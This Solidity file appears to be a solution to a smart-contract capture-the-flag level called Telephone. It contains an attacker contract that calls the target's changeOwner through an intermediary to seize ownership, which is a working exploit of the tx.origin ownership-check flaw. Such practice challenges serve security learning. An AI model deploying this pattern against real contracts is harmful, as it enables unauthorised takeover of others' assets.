// SPDX-License-Identifier: MIT

// Claim ownership of the contract below to complete this level.

pragma solidity ^0.8.17;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone telephone;

    constructor(Telephone telephone_) {
        telephone = telephone_;
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
